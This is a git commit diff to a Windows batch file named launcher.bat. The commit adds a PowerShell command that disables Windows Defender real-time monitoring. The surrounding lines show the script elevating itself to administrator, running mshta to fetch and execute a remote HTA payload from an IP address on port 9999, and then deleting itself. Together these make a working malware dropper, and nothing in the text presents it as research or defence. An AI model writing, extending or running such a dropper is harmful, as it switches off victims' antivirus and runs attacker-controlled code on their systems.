74f569d5ca4f4ad4ab08205c422f825c6fb7b75a
HelloBabyTest <oneid0631@gmail.com>
2025-12-19 00:34:39 +0500

    Add command to disable real-time monitoring

--- launcher.bat
+++ launcher.bat
@@ -4,6 +4,7 @@ if %errorLevel% neq 0 (
     powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
     exit
 )
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 mshta http://192.168.242.131:9999/zza1x
 del "%~f0"
 exit
